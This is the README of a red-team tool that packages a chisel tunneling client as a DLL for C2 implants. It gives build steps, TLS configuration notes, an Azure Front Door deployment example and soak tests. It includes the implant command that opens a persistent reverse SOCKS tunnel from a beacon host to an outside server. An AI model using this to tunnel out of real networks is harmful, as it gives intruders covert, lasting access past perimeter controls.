# chisel-bof — a chisel client as a bare BOF-PE DLL

A from-scratch C implementation of the [jpillora/chisel](https://github.com/jpillora/chisel)
client (v1.12.1 wire protocol, `chisel-v3`) compiled to a single position-independent
x64 DLL with **no CRT, no Go runtime, and only `ws2_32` + `kernel32` imports**. It is
loaded and executed like a Beacon Object File (`go(args, len)` export) but runs as a
long-lived background client, exactly like the real `chisel client` process.

It interoperates byte-for-byte with the **stock unmodified chisel server** — proven
against the official 1.12.0 release binary, run behind **Azure Front Door + caddy**
(the "Testing behind Azure Front Door" section below) as well as directly.

Nothing binary is published in this repository: `build.bat` produces everything from
source, including the crypto static library (pinned + hash-verified fetch of Mbed TLS
3.6.7). If you want to distribute a prebuilt DLL, attach it to a **GitHub Release**
rather than committing it.

## Quick start

```
build.bat
```

or, with an explicit toolchain (the tested configuration):

```
set TOOLCHAIN=C:\path\to\mingw64\bin
build.bat
```

Requirements: Windows x64, mingw-w64 **x86_64** (tested 8.1.0), `curl` + `tar` +
PowerShell (for fetching and hash-verifying the crypto dependency), Python 3 for the
tests. On some hardened hosts gcc's `cc1.exe` cannot start standalone; `GDBWRAP=1`
(the default when `TOOLCHAIN` is set) runs `gcc`/`ar`/`dlltool` under
`gdb --batch -ex run --args`, which is the tested configuration. `GDBWRAP=0` calls
them directly.

Outputs (all git-ignored):

| path | what |
|---|---|
| `build/chiselpe.dll` | the payload — the DLL you execute from the beacon |
| `build/pebdrv.exe` | test driver: packs CLI args BOF-style and calls `go()` |
| `deps/MBED.a` | Mbed TLS static lib, built locally (see below) |
| `deps/WS2_32nat.a` | winsock import lib, generated from the published `.def` |

Force a full rebuild from nothing with:

```
build.bat clean
```

The build **fails loudly**: it deletes every intermediate first (a failed compile left
a stale `.o` behind once, and the link silently produced a fresh-timestamped DLL
running old code), then checks `build/build.log` for error lines.

## The crypto dependency (`deps/MBED.a`)

`MBED.a` is simply Mbed TLS 3.6.7 compiled with **our** trimmed configuration — it is
not a mysterious blob, and it is not published. `tools/build-deps.bat` (called
automatically by `build.bat`) does this:

1. Fetches the GitHub source archive for tag **`v3.6.7`**
   (`https://github.com/Mbed-TLS/mbedtls/archive/refs/tags/v3.6.7.tar.gz`) and verifies
   its SHA-256 against the pin in that script
   (`7312b70b067b6a271961c8d36c3b8f9ba3e86fe6b26f18af13cd70430ee52ed1`). The build
   refuses to link against a crypto tree that is not exactly that one. `library/`,
   `include/` and `3rdparty/` of that archive were verified byte-identical to the tree
   this client was developed and tested against — there are **no local Mbed TLS
   patches**.
2. Compiles `deps/mbedtls-3.6.7/library/*.c` (109 files) plus our own
   `src/mbedfmt.c` (`snprintf`/`vsnprintf` for Mbed TLS's debug output), with
   **`deps/mbedinc` first on the include path**, so `deps/mbedinc/mbedtls/mbedtls_config.h`
   wins over upstream's config.
3. Archives the objects into `deps/MBED.a` (in batches — ~110 quoted absolute paths
   exceed `cmd`'s 8191-character command-line limit) and generates `deps/WS2_32nat.a`
   from `deps/WS2_32nat.def` with `dlltool`.

Offline build: download the archive yourself, verify the hash, unpack so that
`deps/mbedtls-3.6.7/library/` exists, then run `build.bat`.

**The configuration is load-bearing.** `deps/mbedinc/mbedtls/mbedtls_config.h` decides
which `.c` files contribute code, so a different config means a different `MBED.a` —
and a client that cannot talk to public infrastructure. These groups must not be
dropped:

- `MBEDTLS_ECP_DP_SECP256R1_ENABLED`, `SECP384R1_ENABLED`, `SECP521R1_ENABLED` **and
  the matching** `PSA_WANT_ECC_SECP_R1_256/_384/_521`, `PSA_WANT_ALG_ECDH`,
  `KEY_TYPE_ECC_KEY_PAIR_BASIC/IMPORT/EXPORT`, `ECC_PUBLIC`. Public CA chains
  (Let's Encrypt, Azure Front Door, caddy's internal CA) carry NIST **P-384**
  intermediates/roots, and the chain is **parsed before** `VERIFY_NONE` can apply —
  without the curve support the handshake dies at
  `MBEDTLS_ERR_PK_UNKNOWN_NAMED_CURVE (-0x3A00)` and no amount of certificate-verification
  skipping helps. `MBEDTLS_ECP_DP_*` and `PSA_WANT_ECC_*` must both list a curve: the
  PSA layer only registers curves it is explicitly told to want.
- `MBEDTLS_SSL_SERVER_NAME_INDICATION`: without it `mbedtls_ssl_set_hostname()` sets
  only the verification hostname and puts **no SNI extension on the wire, silently** —
  every multi-tenant front-end then routes the (perfectly valid) TLS connection to its
  default site, and you get `404`.
- `MBEDTLS_SSL_KEEP_PEER_CERTIFICATE` + `MBEDTLS_PEM_PARSE_C` (the client walks the
  chain), `ECDHE_RSA`/`ECDHE_ECDSA` key exchange, `TLS1_2` and `TLS1_3` protocol
  objects. The client itself **pins min = max = TLS 1.2**: this trimmed Mbed TLS build
  gets `handshake_failure` (fatal alert 40, `-0x7780`) from Azure Front Door when it
  offers TLS 1.3, so 1.2 is the verified working level, not an oversight.

## Running it from a C2

The DLL exports `go(const char *args, int len)` taking Beacon-packed string arguments
(`z` format). Two strings: the server URL, then the remote list. Always `https://`
(or `wss://`) — the transport is always TLS, so `ws://`/`http://` URLs are not useful.

**Outflank Security Tooling (OST):**

```
exec_bof_async  zz  https://fdname-b0g7arfhaph9dca0.z02.azurefd.net  "R:1080:socks"
```

In the OST web UI the same thing is the implant's **Execute BOF** task
(`exec_bof_async`): artifact = `build/chiselpe.dll`, entry point `go`, argument format
`zz` followed by the URL and the remote. Other Beacons: use their BOF-execute primitive
with entry point `go` and the `zz` packed format.

Two things that look wrong but are expected:

1. **The task never completes.** The proxy is resident — `go()` returns only if you kill
   it. Use the async variant (`exec_bof_async`, not a synchronous execute) so the beacon
   thread stays free; the tunnel lives as long as the implant does. Stop it by killing
   the task or the implant.
2. **`R:` remotes bind on the SERVER, not on the beacon host.** Verify on the machine
   running the chisel server:

   ```
   ss -tlnp | grep :1080                                   # socks bound by the server
   curl -x socks5h://127.0.0.1:1080 -o /dev/null -w '%{http_code}\n' https://example.com
   ```

   With the server started with `-v` you should see
   `session#N: Open (user=- addr=… remotes=R:1080:socks)` and `Bound proxies`.

### Remote syntax (chisel-compatible)

| feature | syntax | notes |
|---|---|---|
| SOCKS5 on the server | `R:1080:socks` | SOCKS5 hostname CONNECTs are resolved **on the client** (`socks5h` semantics) |
| reverse port forward | `R:<bind>:<host>:<port>` | `R:127.0.0.1:2222:10.0.0.5:22` |
| reverse UDP relay | `R:<bind>:<host>:<port>/udp` | full gob `udpPacket{Src,Payload}` codec with source-peer fidelity (chisel's DNS path) |
| forward remote | `<lport>:<host>:<port>` | local listener on the beacon host |
| auth | server `--auth` | the client sends the `Authorization` header on the upgrade |
| keepalive / reconnect | server pings every 25 s | the client answers; any session death triggers redial + re-declaration (2 s backoff, never gives up on front-end `5xx`) |

## Testing behind Azure Front Door (worked example)

Real topology this client is proven on:

```
client (the DLL)
  -> https://<fd-name>-xxxx.z02.azurefd.net:443      Azure Front Door terminates TLS
  -> <vm>.cloudapp.azure.com:443                     caddy (site block proxying to the backend)
  -> 127.0.0.1:8000                                  plain: chisel_1.12.0 server --port 8000 --reverse
```

The chisel server runs **plain HTTP** (`--reverse`, no `--tls`): the TLS terminus is the
front-end, so the client must speak TLS to it and the front-end must forward the
WebSocket upgrade. Verify the front-end accepts a chisel upgrade before touching the
client, from any machine:

```
curl -s -o /dev/null -D - --http1.1 \
  -H 'Connection: Upgrade' -H 'Upgrade: websocket' \
  -H 'Sec-WebSocket-Version: 13' -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' \
  -H 'Sec-WebSocket-Protocol: chisel-v3' \
  https://<fd-name>-xxxx.z02.azurefd.net/
```

Expect `HTTP/1.1 101 Switching Protocols` (+ `Sec-WebSocket-Protocol: chisel-v3`).
A plain `GET /` returning `404` is **normal** — chisel only answers the upgrade.

Everything below was an actual failure of an earlier build against exactly this chain;
each one passes locally (a plain chisel server ignores SNI, certificate chains and the
`Host` header) and only fails behind a public front-end:

| symptom on the wire | cause | status |
|---|---|---|
| handshake dies at `-0x3A00` | config lacked P-384/P-521; AFD's chain is ECDSA with P-384 intermediates/roots, parsed before `VERIFY_NONE` applies | fixed (config) |
| `404` from the front-end after a clean handshake | no SNI extension (compiled out) → routed to the default frontend | fixed (config) |
| `421 Misdirected Request`, error info `SSLMismatchedSNI` | `Host:` was written as `host` + port digits with **no colon** (`…azurefd.net8443`); AFD correlates SNI with `Host` | fixed (`Host: host[:port]`, port omitted for the scheme default, exactly like Go's `net/http`) |
| client exits ~2 s after the backend restarts | the `no 101` path shared the 16-try hard-connect budget: caddy/AFD still complete TLS and answer `502` while chisel is down | fixed (back off and redial forever; only real connect failures are bounded, so a wrong URL still returns control to the beacon) |
| `session#N: Close (…) (error ssh: remote side wrote too much)` after ~10 min of browsing | client-side SSH flow-control accounting (see *Stability*) | fixed |

Useful checks while it runs:

- `https://` (or `wss://`) URL, no `ws://`; the port may be omitted (`443` default) — the
  `Host` header then reads `host` with no port, like a Go client's.
- Front-ends hand out one anycast address; different `x-azure-ref` values mean different
  POPs, not flakiness.
- **Reconnect through the front end**: stop the chisel backend, leave it down ~20 s
  (caddy/AFD keep answering, now with `502`), start it again — the untouched running
  client re-dials and the socks port is `LISTEN` again within ~6 s. Measured.
- TLS 1.3: this trimmed build is pinned to TLS 1.2 (AFD rejects its TLS 1.3 ClientHello
  with fatal alert 40). AFD happily negotiates `ECDHE-ECDSA-AES256-GCM-SHA384`.

## Stability: what to test, and why `curl` is not enough

Throughput tests with a fast consumer (`curl` a 100 MB file, browse 1.5 GB) pass even
when the client has flow-control bugs, because the SSH channel window never goes
boundary-exact and a WebSocket write never parks half-written. The shape that exposes
it is **many concurrent channels whose application reads slowly** — RDP, Ad Explorer,
a browser — which is exactly what breaks in real use. The harness in `tests/`:

| test | what it does | pass condition |
|---|---|---|
| `tests/slowapp.py` | N parallel SOCKS5 fetches of `tests/pub/big.bin` (make it with `tests/mkpayload.py`), each read in 16 KiB chunks with a delay — ~320 KiB/s per stream | byte count **and SHA-256** of every stream; and the session is still alive (socks port still `LISTEN`) |
| `tests/slowtarget.py` | a target that accepts but reads 4 KiB every 2 s | the client paces to 2 KiB/s instead of buffering ahead |
| `tests/stalltarget.py` + `tests/uplapp.py` | a target that reads 8 KiB then **stops reading for 160 s**, while 2 MB is pushed at it | no spin (client CPU flat), no missed pings, only that channel is lost — other channels keep working byte-exact |
| `tests/udp_test.py` + `tests/udp_echo.py` | chisel's gob UDP codec: multi-socket, source-port fidelity, same-socket reuse, 1000 B datagrams | `UDP-TEST PASS` |

Run them (server-side = the machine running the chisel server; the target is dialled by
the client, so the payload HTTP server runs on the client machine):

```
# client machine
python tests\mkpayload.py 6291456
python -m http.server 19101 --directory tests\pub
build\pebdrv.exe build\chiselpe.dll https://127.0.0.1:8406 "R:1080:socks"

# server machine
python tests\slowapp.py 1080 6              # 6 slow streams
python tests\slowapp.py 1080 12 20971520 8192 0.1   # heavier soak
```

Reference results on the real AFD -> caddy -> chisel chain, 12 slow streams x 20 MB:
the buggy build returned `0/12` streams intact and the session was aborted 66 s in
(`ssh: remote side wrote too much`); the current build returns `12/12` with matching
hashes and the session still bound 270 s later. Locally: `0/6` before, `6/6` after.

The invariants that keep it stable, in `src/sshtun.c` — worth knowing before patching:

- **`flush_pend` is the only place that emits a channel-data (`t=94`) frame**, and every
  payload byte it emits is charged against the channel window exactly once. The server
  aborts the *whole session* (`vendored/ssh/channel.go:336`,
  `if ch.myWindow < length`) if we overrun the credit it granted; a helper that emits
  channel data "just for the SOCKS handshake reply" desynced it by 12 bytes per channel.
- The WebSocket writer has three distinct outcomes and the caller must distinguish them:
  frame fully written / frame **committed** to the non-blocking outbox (partially
  written, `ws_outbox_flush` finishes it) / **refused** (the outbox still holds the
  previous frame, nothing went out). Reading the second as the third re-sent the same
  payload — duplicated stream bytes *and* phantom window credit.
- Channel EOF (`96`) is **deferred** until the queue has drained: sending it while bytes
  are parked tells the server the stream ended, and those bytes are silently lost
  (measured: every window-stalled download 1.2-9.4 KiB short).
- Target writes never spin: they wait for writability with a bounded select and give up
  on that channel after ~30 s. One thread services TLS, the WebSocket, the server's
  25 s ping and every channel, so a tight loop in one target's write path stops us
  answering pings and the server tears the session down ~125 s later.
- Window-stalled channels are excluded from the `select()` set (their target stays
  readable, which would spin the pump at ~66k syscalls/s); `rx93` / `pump_round` resume
  them. Channel table is 256 slots (`CH_N`), window `CH_W = 2097152` and
  `CH_MAX = 32768` deliberately match x/crypto's `channelWindowSize` /
  `channelMaxPacket` exactly.

## Relocation hygiene

Built with `--dynamicbase`; run the audit before shipping:

```
python tools\pehl2dir.py build\chiselpe.dll out.dll --audit
```

Expected: **587/587** absolute slots in-image, rewritable to `IMAGE_REL_BASED_DIR64`
(the script can rewrite them in place). Any out-of-image absolute slot is a
load-address hazard for Beacon's loader.

## Layout

```
build.bat                 one command: deps + payload (and `clean`)
tools/build-deps.bat      fetch + verify + build Mbed TLS, generate the winsock import lib
src/stock.c               BOF entry (`go()`), winsock/TLS glue, WS framing, outbox
src/sshtun.c              the tunnel: SSH transport (chacha20-poly1305), channel layer,
                          flow control, chisel control protocol, TCP + UDP remotes
src/mbedfmt.c             snprintf/vsnprintf used by Mbed TLS debug output
src/crypto.c              SHA-256, SSH KDF, chacha20, poly1305, base64
src/x25519.c              X25519 (Montgomery ladder, RFC 8032)
src/chisel_crypto.h       shared crypto declarations
deps/mbedinc/mbedtls/mbedtls_config.h   the trimmed config (load-bearing, see above)
deps/chiselpe.def         DLL exports (`go @1`)
deps/WS2_32nat.def        winsock imports by ordinal (the `.a` is generated)
tools/pebdrv.c            test loader: packs CLI args BOF-style, calls `go()`
tools/pehl2dir.py         HIGHLOW -> DIR64 base-relocation audit/rewriter
tests/                    slow-consumer soak, wedged-target pair, UDP suite
```

Generated, never committed: `build/`, `deps/MBED.a`, `deps/WS2_32nat.a`,
`deps/mbedtls-*/`, `deps/_mbedtls-*.tar.gz`, `tests/pub/`.

## Wire facts worth knowing (learned the hard way)

- gob integers are **not** uvarint: `<128` is one byte, otherwise `-bytelen ||
  big-endian` (1000 -> `fe 03 e8`). The UDP codec hardcodes the server's exact 43-byte
  type-def message; field deltas count from -1.
- SSH channel windows are enforced by the peer: the default window is 2 MiB and the
  maximum packet 32 KiB, and both sides track the credit independently.
- The stock server closes tunnels with channel-EOF (96) only, never 97.
- winsock1 `socket(2, SO_ANY, IPPROTO_UDP=17)` is the only form that puts real UDP on
  the wire; `WSAStartup` must be given a real 512-byte `WSADATA` buffer.
- The server rekeys the SSH transport at `1 << 30` bytes; the client must survive it
  (`do_rekey`) — sustained browsing crosses that line within minutes.

## Third-party and licensing

- **Mbed TLS 3.6.7** (Apache-2.0 / GPL-2.0 dual) — fetched and verified at build time,
  never committed; unmodified sources compiled with `deps/mbedinc/…/mbedtls_config.h`.
- **jpillora/chisel** (MIT) is the protocol reference; this implementation is original C
  and contains no Go or chisel source.
- This repository's own code: MIT, see `LICENSE`.
